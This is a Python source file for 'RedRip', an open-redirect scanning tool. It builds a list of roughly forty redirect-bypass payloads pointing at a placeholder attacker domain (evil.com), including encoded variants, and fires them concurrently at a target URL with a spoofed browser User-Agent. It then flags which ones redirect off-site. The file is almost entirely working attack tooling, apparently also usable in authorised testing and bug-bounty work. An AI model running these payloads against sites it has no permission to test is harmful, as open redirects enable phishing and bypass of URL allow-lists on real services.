import argparse
import os
import requests
from urllib.parse import quote, urlparse
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

def print_banner():
    WHITE = '\033[97m'
    GREEN = "\033[92m"
    simon=(GREEN + r"""
               _____  _____ __  __  ____  _   _ 
              / ____| _   _|  \/  |/ __ \| \ | |
              | (___   | | | \  / | |  | |  \| |
               \___ \  | | | |\/| | |  | | . ` |
               ____) |_| |_| |  | | |__| | |\  |
              |_____/|_____|_|  |_|\____/|_| \_|""")
    a=(WHITE + r"""
 ____         
|  _ \   ___   __| |(_) _ __ 
| |_) | / _ \ / _` || || '__|
|  _ < |  __/| (_| || || |    
|_| \_\ \___| \__,_||_||_|""")

    print(a+simon)

def generate_payloads(domain="evil.com"):
    base = f"https://{domain}"
    raw_payloads = [
        base,
        f"http://{domain}",
        f"//{domain}",
        f"{domain}/",
        f"https://{domain}@any.com",
        f"https://any.com@{domain}",
        f"https://any.com#@{domain}",
        f"https://any.com#https://{domain}",
        f"https://any.com?next=https://{domain}",
        f"https://any.com?url=https://{domain}",
        f"https://any.com?redirect=https://{domain}",
        f"https://any.com?target=https://{domain}",
        f"https://any.com/%2e%2e/{domain}",
        f"https://any.com/%2f%2f{domain}",
        f"https://any.com/..;/https://{domain}",
        f"https://any.com/.%2e/{domain}",
        f"https://any.com/%23{domain}",
        f"https://any.com/%3Furl=https://{domain}",
        f"https://any.com//{domain}",
        f"https://any.com///{domain}",
        f"https://any.com/?url=https://{domain}",
        f"https://any.com/#https://{domain}",
        f"https://any.com/%00{domain}",
        f"https://any.com/%09{domain}",
        f"https://any.com/%20{domain}",
        f"https://any.com/%2f{domain}",
        f"https://any.com/;@{domain}",
        f"https://any.com/.;@{domain}",
        f"https://any.com/??https://{domain}",
        f"https://any.com/#@{domain}",
        f"https://any.com/%0d%0ahttps://{domain}",
        f"https://any.com/evil@{domain}",
        f"https://:@{domain}",
        f"https://{domain}:pass@any.com",
        f"https://@{domain}",
        f"https://%40{domain}",
        f"https://%2540{domain}",
        f"https://login:{domain}@any.com"
    ]

    encoded_payloads = []
    for p in raw_payloads:
        encoded_payloads.append(quote(p, safe='/:?=&@#'))
        encoded_payloads.append(p.replace("https://", "https:%2F%2F"))
        encoded_payloads.append(p.replace("https://", "https%3A%2F%2F"))

    return list(dict.fromkeys(raw_payloads + encoded_payloads))

def load_wordlist(path):
    if not os.path.isfile(path):
        print(Fore.RED + f"[!] Wordlist not found: {path}")
        return []
    with open(path, encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

def is_redirect_to_domain(location, domain):
    try:
        if not location:
            return False
        parsed = urlparse(location)
        return domain in parsed.netloc or domain in location
    except:
        return False

def test_payload(target_base, payload, domain, timeout=5):
    full_url = target_base + quote(payload, safe='')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
                      "(KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
    }
    try:
        res = requests.get(full_url, headers=headers, allow_redirects=False, timeout=timeout)
        status = res.status_code
        loc = res.headers.get('Location', '')
        if loc and is_redirect_to_domain(loc, domain):
            return f"[{status}] ✅ Redirect to {loc}", full_url, True
        elif loc:
            return f"[{status}] ⚠️ Redirect to {loc}", full_url, False
        else:
            return f"[{status}] ❌ No redirect", full_url, False
    except Exception as e:
        return f"[ERROR] {e}", full_url, False

def main():
    parser = argparse.ArgumentParser(description="RedRip - Open Redirect Tester")
    parser.add_argument("target", help="Vulnerable URL base (e.g., https://site.com/?url=)")
    parser.add_argument("-w", "--wordlist", help="Path to custom payload list")
    parser.add_argument("-s", "--save", help="Save results to file")
    parser.add_argument("-f", "--full", action="store_true", help="Show full tested URLs")
    parser.add_argument("-d", "--domain", default="evil.com", help="Target domain for redirection (default: evil.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    args = parser.parse_args()

    print_banner()
    print(Fore.YELLOW + f"Target: {args.target}")
    print(Fore.YELLOW + f"Redirect domain: {args.domain}")
    print(Fore.YELLOW + f"Payload source: {'Custom wordlist' if args.wordlist else 'Generated payloads'}")
    print(Fore.YELLOW + f"Threads: {args.threads}")
    print("----------------------------------------------------")

    payloads = load_wordlist(args.wordlist) if args.wordlist else generate_payloads(args.domain)
    results = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_payload = {executor.submit(test_payload, args.target, payload, args.domain): payload for payload in payloads}
        for future in as_completed(future_to_payload):
            status_msg, full_url, is_redirect = future.result()
            color = Fore.GREEN if is_redirect else Fore.RED
            print(color + status_msg)
            if args.full:
                print(Fore.CYAN + f"URL: {full_url}")
            results.append(f"{status_msg}\n{full_url if args.full else ''}")

    if args.save:
        with open(args.save, "w", encoding='utf-8') as f:
            f.write("\n".join(results))
        print(Fore.GREEN + f"\nResults saved to {args.save}")

    print(Fore.GREEN + "\nDone. Stay sharp. Hack the redirectors.\n")

if __name__ == "__main__":
    main()
